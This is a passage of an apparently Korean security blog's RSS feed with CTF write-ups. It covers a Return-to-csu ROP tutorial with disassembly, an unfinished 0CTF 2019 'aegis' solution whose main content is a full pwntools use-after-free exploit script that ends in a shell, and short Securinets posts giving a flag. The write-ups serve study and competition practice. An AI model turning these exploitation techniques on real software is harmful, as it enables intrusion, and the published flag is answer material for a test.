none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">C와 Python의 연산 속도는 약 100배가량  차이가  난다.<a href="#fnref:1" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Reutrn-to-Csu Theory</title>
      <link>http://j0n9hyun.github.io/2019/04/01/rtc_theory/</link>
      <guid>http://j0n9hyun.github.io/2019/04/01/rtc_theory/</guid>
      <pubDate>Mon, 01 Apr 2019 05:00:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;return-to-csu&quot;&gt;&lt;a class=&quot;markdown
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="return-to-csu"><a class="markdownIt-Anchor" href="#return-to-csu"></a> Return-to-csu</h2><p><a href="https://ctf.j0n9hyun.xyz/files/240f3f36125011483a357c5c8fb0fb4a/rtc" target="_blank" rel="noopener">Binary File</a></p><p>64bit ROP 기법을 사용할 때 우리는 gadget을 이용하곤 한다. 하지만 우리가 원하는 pop gadget이 존재하지 않을 경우는 어떻게 할까?<br>바로 RTC 를 사용하여 우회를 시킬 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hey, ROP! What's Up?\n"</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[Problem]</small></center>확인하기 위해 본인 사이트에 올라가 있는 문제를 예시로 들겠다. 문제에는 일반적인 ROP처럼 write 함수와 read 함수가 주어져있다. <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[INFO] File: rtc</span><br><span class="line"><span class="number">0x00000000004006bc</span>: pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006be</span>: pop r13; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006c0</span>: pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006c2</span>: pop r15; ret; </span><br><span class="line"><span class="number">0x000000000040054f</span>: pop rbp; mov edi, <span class="number">0x601048</span>; jmp rax; </span><br><span class="line"><span class="number">0x00000000004006bb</span>: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006bf</span>: pop rbp; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x0000000000400560</span>: pop rbp; ret; </span><br><span class="line"><span class="number">0x00000000004006c3</span>: pop rdi; ret; </span><br><span class="line"><span class="number">0x00000000004006c1</span>: pop rsi; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006bd</span>: pop rsp; pop r13; pop r14; pop r15; ret;</span><br></pre></td></tr></table></figure><center><small>[gadgets]</small></center>gadget 도구를 이용해서 확인해보면 rdi와 rsi를 채울 수 있을만한 gadget이 보이지 않는다. 그래도 괜찮다 우리에겐 csu가 있으니까!  _libc_csu_init 이라는 함수를 어셈블리 뷰로 확인해보자. <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400660</span> ; <span class="keyword">void</span> _libc_csu_init(<span class="keyword">void</span>)</span><br><span class="line">.text:<span class="number">0000000000400660</span> <span class="keyword">public</span> __libc_csu_init</span><br><span class="line">.text:<span class="number">0000000000400660</span> __libc_csu_init proc near</span><br><span class="line">.text:<span class="number">0000000000400660</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400660</span> push    r15</span><br><span class="line">.text:<span class="number">0000000000400662</span> push    r14</span><br><span class="line">.text:<span class="number">0000000000400664</span> mov     r15d, edi</span><br><span class="line">.text:<span class="number">0000000000400667</span> push    r13</span><br><span class="line">.text:<span class="number">0000000000400669</span> push    r12</span><br><span class="line">.text:<span class="number">000000000040066B</span> lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:<span class="number">0000000000400672</span> push    rbp</span><br><span class="line">.text:<span class="number">0000000000400673</span> lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:<span class="number">000000000040067</span>A push    rbx</span><br><span class="line">.text:<span class="number">000000000040067B</span> mov     r14, rsi</span><br><span class="line">.text:<span class="number">000000000040067</span>E mov     r13, rdx</span><br><span class="line">.text:<span class="number">0000000000400681</span> sub     rbp, r12</span><br><span class="line">.text:<span class="number">0000000000400684</span> sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000000400688</span> sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">000000000040068</span>C call    _init_proc</span><br><span class="line">.text:<span class="number">0000000000400691</span> test    rbp, rbp</span><br><span class="line">.text:<span class="number">0000000000400694</span> jz      <span class="keyword">short</span> loc_4006B6</span><br></pre></td></tr></table></figure><center><small>[libc_csu_init]</small></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004006B</span>6 loc_4006B6:</span><br><span class="line">.text:<span class="number">00000000004006B</span>6 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004006B</span>A pop     rbx</span><br><span class="line">.text:<span class="number">00000000004006B</span>B pop     rbp</span><br><span class="line">.text:<span class="number">00000000004006B</span>C pop     r12</span><br><span class="line">.text:<span class="number">00000000004006B</span>E pop     r13</span><br><span class="line">.text:<span class="number">00000000004006</span>C0 pop     r14</span><br><span class="line">.text:<span class="number">00000000004006</span>C2 pop     r15</span><br><span class="line">.text:<span class="number">00000000004006</span>C4 retn</span><br><span class="line">.text:<span class="number">00000000004006</span>C4 ; &#125; <span class="comment">// starts at 400660</span></span><br><span class="line">.text:<span class="number">00000000004006</span>C4 __libc_csu_ini</span><br></pre></td></tr></table></figure><center><small>[libc_csu_init gadget1]</small></center>여기서 우리가 조작할 수 있는 주소는 rbx, rbp, r12, r13, r14, r15 이다.  첫번째, 두번째 인자값을 받는 rdi, rsi가 없는데 어떻게 할 수 있을까란 생각이 들 수 있겠지만 그 부분은 바로 아래의 코드를 확인하면 알 수 있을 것이다. <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004006</span>A0 loc_4006A0:</span><br><span class="line">.text:<span class="number">00000000004006</span>A0 mov     rdx, r13</span><br><span class="line">.text:<span class="number">00000000004006</span>A3 mov     rsi, r14</span><br><span class="line">.text:<span class="number">00000000004006</span>A6 mov     edi, r15d</span><br><span class="line">.text:<span class="number">00000000004006</span>A9 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">00000000004006</span>AD add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000004006B</span>1 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">00000000004006B</span>4 jnz     <span class="keyword">short</span> loc_4006A0</span><br></pre></td></tr></table></figure><center><small>[libc_csu_init gadget2]</small></center><p>[gadget1] 코드에서 pop 해줬던 r15,r14,r13 값을 다시 edi,rsi,rdx에 셋팅한다.(보다시피 rdi가 아닌 edi라서 edi 값은 32비트 범위의 한해서만 조작이 가능하다.)<br>그리고는 <strong>r12+rbx*8</strong>한 값을 호출하는데 rbx 값을 0으로 셋팅해준다면 <strong>0[rbx] * 8</strong>이 돼서 최종적으로 r12의 값만 호출할 수 있게끔 한다.<br>rbx의 값에 1을 더하고 rbp값과 비교연산을 거친다. rbx값을 1로 셋팅해준다면 조건분기문도 성립되어 문제 없이 통과하게 된다.</p><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/04/01/rtc_theory/#disqus_thread</comments>
    </item>
    
    <item>
      <title>0CTF CTF 2019 aegis (Incompletion)</title>
      <link>http://j0n9hyun.github.io/2019/03/26/0ctf_aegis/</link>
      <guid>http://j0n9hyun.github.io/2019/03/26/0ctf_aegis/</guid>
      <pubDate>Tue, 26 Mar 2019 01:45:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;aegis&quot;&gt;&lt;a class=&quot;markdownIt-Ancho
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="aegis"><a class="markdownIt-Anchor" href="#aegis"></a> aegis</h2><p><a href="https://github.com/j0n9hyun/j0n9hyun.github.io/files/3217656/aegis.zip" target="_blank" rel="noopener">Binary File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036090-3c97b780-7b65-11e9-8554-7350b7a0f423.PNG"><center><small>[Mitigation]</small></center>잘 안 보이는 보호기법이 추가되었다. (대회에서 나온 거 처음 봄) <br> <br>  <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036091-3dc8e480-7b65-11e9-9465-a19934888c08.PNG"><center><small>[In IDA]</small></center>IDA를 통해서 열어보면 ASAN, UBSAN 보호기법의 영향으로 마치 libc 파일을 여는 듯이 불러오는 함수가 많다. (보기 싫어진다) <br> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036135-5a651c80-7b65-11e9-9ae8-7a2c1f7ccec1.PNG"><center><small>[main.c]</small></center>여느 힙 문제와 같이 메뉴들이 주어졌는데 하단에 보면 히든 메뉴가 있다. <br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036136-5a651c80-7b65-11e9-9aa9-e802bbd6a61d.PNG"><center><small>[굉장히 보기 싫게 생긴 코드]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036134-59cc8600-7b65-11e9-9391-584f6eda43d2.PNG"><center><small>[delete menu]</small></center>이 부분에서 UAF가 발생한다. <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./aegis'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size, content, ID)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, str(content))</span><br><span class="line">    p.sendlineafter(<span class="string">"ID: "</span>, str(ID))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Content: "</span>, str(p.recvline))</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_note_sendline</span><span class="params">(index, new_content, new_ID)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"New Content: "</span>, str(new_content))</span><br><span class="line">    p.sendlineafter(<span class="string">"New ID: "</span>, str(new_ID))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_note</span><span class="params">(index, new_content, new_ID)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">"New Content: "</span>, str(new_content))</span><br><span class="line">    p.sendlineafter(<span class="string">"New ID: "</span>, str(new_ID))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">(addr)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"666"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Lucky Number: "</span>, str(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_asan</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ((addr &gt;&gt; <span class="number">3</span>) + <span class="number">0x7fff8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_word</span><span class="params">()</span>:</span></span><br><span class="line">    note_data = show_note(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"note data"</span>, note_data</span><br><span class="line">    note_data = note_data.split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    note_data = (u64(note_data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)))</span><br><span class="line">    <span class="keyword">return</span> note_data</span><br><span class="line"></span><br><span class="line">VAL = <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">add_note(<span class="number">16</span>, <span class="string">"a"</span>*<span class="number">8</span>, VAL)</span><br><span class="line">add_note(<span class="number">16</span>, <span class="string">"b"</span>*<span class="number">8</span>, VAL)</span><br><span class="line">addr = to_asan(<span class="number">0x602000000020</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"magiccc"</span>, hex(addr)</span><br><span class="line">secret(addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do 1st update</span></span><br><span class="line">update_note(<span class="number">0</span>, <span class="string">'C'</span>*<span class="number">18</span>, <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do 2nd update</span></span><br><span class="line">payload  = <span class="string">'d'</span>*<span class="number">16</span> + <span class="string">'\x02'</span>*<span class="number">3</span></span><br><span class="line">payloadid = <span class="number">0xffffffff02ffffff</span></span><br><span class="line">update_note_sendline(<span class="number">0</span>, payload, payloadid)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">add_note(<span class="number">16</span>, p64(<span class="number">0x602000000018</span>), <span class="number">0x00</span>)</span><br><span class="line">note_data = leak_word()</span><br><span class="line">cfi = note_data</span><br><span class="line">text_base = note_data - <span class="number">1133232</span></span><br><span class="line">log.progress(<span class="string">"Text base: &#123;&#125;"</span>.format((hex(text_base))))</span><br><span class="line"></span><br><span class="line">got_offset = <span class="number">0x000000000347E28</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arb_read</span><span class="params">(addr)</span>:</span></span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">1</span>)+<span class="string">"\n"</span>, VAL)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">2</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">4</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">6</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">8</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, p64(addr)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">"\n"</span>, cfi)</span><br><span class="line"></span><br><span class="line">    note_data = leak_word()</span><br><span class="line">    <span class="keyword">return</span> note_data</span><br><span class="line"></span><br><span class="line">libc = arb_read(got_offset + text_base)</span><br><span class="line"></span><br><span class="line">libc -= <span class="number">526784</span></span><br><span class="line">log.progress(<span class="string">"LIBC: &#123;&#125;"</span>.format(hex(libc)))</span><br><span class="line">one_gadget = libc + <span class="number">0x10a38c</span>+<span class="number">12</span></span><br><span class="line">log.progress(<span class="string">"ONE GADGET: &#123;&#125;"</span>.format(hex(one_gadget)))</span><br><span class="line"></span><br><span class="line">malloc_hook_offset = <span class="number">0x00000000003ebc30</span></span><br><span class="line">main_arena_offset = <span class="number">4111424</span></span><br><span class="line">asan_malloc_hook_offset = <span class="number">0x7ae140</span></span><br><span class="line">san_userdie_callback = <span class="number">0xFB0888</span></span><br><span class="line">strtoul_got_offset = <span class="number">0x347f20</span></span><br><span class="line">environ_offset = <span class="number">4120728</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># intercepted methods</span></span><br><span class="line">real_vprintf_off = <span class="number">0x55BBB0</span></span><br><span class="line">real_memset_off = <span class="number">0x55Bd30</span></span><br><span class="line">real_cxa_atexit = <span class="number">0x559208</span></span><br><span class="line"></span><br><span class="line">update_func = text_base + <span class="number">0x114614</span></span><br><span class="line">main_func = text_base + <span class="number">0x114990</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># perform overwrite!</span></span><br><span class="line">overwrite_addr = text_base + san_userdie_callback + <span class="number">0x18</span> </span><br><span class="line">pop_rdx_rcx_rbx_ret = <span class="number">0x0000000000103cc9</span> </span><br><span class="line">ret = <span class="number">0x0000000000b17c5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arb_write</span><span class="params">(addr, val, idval = <span class="number">0</span>, use_cfi = True)</span>:</span></span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">1</span>)+<span class="string">"\n"</span>, VAL)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">2</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">4</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">6</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">8</span>), <span class="number">0xffff</span>)</span><br><span class="line">    mycfi = cfi <span class="keyword">if</span> use_cfi <span class="keyword">else</span> <span class="number">0</span> </span><br><span class="line">    update_note(<span class="number">2</span>, p64(addr)[<span class="number">0</span>:<span class="number">6</span>] + <span class="string">"\n"</span>, one_gadget &lt;&lt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"idval"</span>, hex(idval)</span><br><span class="line">    update_note(<span class="number">0</span>, p64(val)[<span class="number">0</span>:<span class="number">6</span>] + <span class="string">"\n"</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_trunc</span><span class="params">(index, new_content, new_ID)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"New Content: "</span>, str(new_content))</span><br><span class="line">    p.sendlineafter(<span class="string">"New ID: "</span>, str(new_ID))</span><br><span class="line"></span><br><span class="line">rop_gadget = libc + <span class="number">0x9df05</span></span><br><span class="line">arb_write(overwrite_addr, rop_gadget, idval=libc + ret, use_cfi = <span class="literal">False</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/26/0ctf_aegis/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 EZ</title>
      <link>http://j0n9hyun.github.io/2019/03/25/EZ/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/EZ/</guid>
      <pubDate>Mon, 25 Mar 2019 07:27:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;ez&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; 
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="ez"><a class="markdownIt-Anchor" href="#ez"></a> EZ</h2><p><a href="#" class="btn_success">File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034097-bda08000-7b60-11e9-80b3-5a9c06483d2b.PNG"><center><small>[Problem]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034098-bda08000-7b60-11e9-9289-c9c21922caf7.PNG"><center><small>[Steganography Decoding]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034100-bda08000-7b60-11e9-9c8d-9b239b667f3e.PNG"><center><small>[Hidden.txt]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034101-bda08000-7b60-11e9-99da-ae3cbfcdd87e.PNG"><center><small>[Googling]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034096-bd07e980-7b60-11e9-8b05-dd7b66865c84.PNG"><center><small>[SHA-1 Encoding]</small></center> <br><blockquote><p>flag is <strong>Securinets{b47f0d2a8866a75696f94a515d0cdf54c7ea3174}</strong></p></blockquote><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/EZ/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 HIDDEN</title>
      <link>http://j0n9hyun.github.io/2019/03/25/securinets_hidden/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/securinets_hidden/</guid>
      <pubDate>Mon, 25 Mar 2019 06:41:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;hidden&quot;&gt;&lt;a class=&quot;markdownIt-Anch
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="hidden"><a class="markdownIt-Anchor" href="#hidden"></a> HIDDEN</h2><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58033845-36530c80-7b60-11e9-903a-a6f0731646c8.PNG"><center><small>[Problem]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58033942-6c908c00-7b60-11e9-9858-264ee597dccc.PNG"><center><small>[Web Page]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58033943-6d292280-7b60-11e9-80d0-de53fe56db7f.PNG"><center><small>[Get FLAG]</small></center> <br><style>img.border-shadow {border:1px solid #888888;box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);}</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/securinets_hidden/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 Easy Trade</title>
      <link>http://j0n9hyun.github.io/2019/03/25/securinet_easy_trade/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/securinet_easy_trade/</guid>
      <pubDate>Mon, 25 Mar 2019 06:25:00 GMT</pubDate>
      <description>
      
        
        
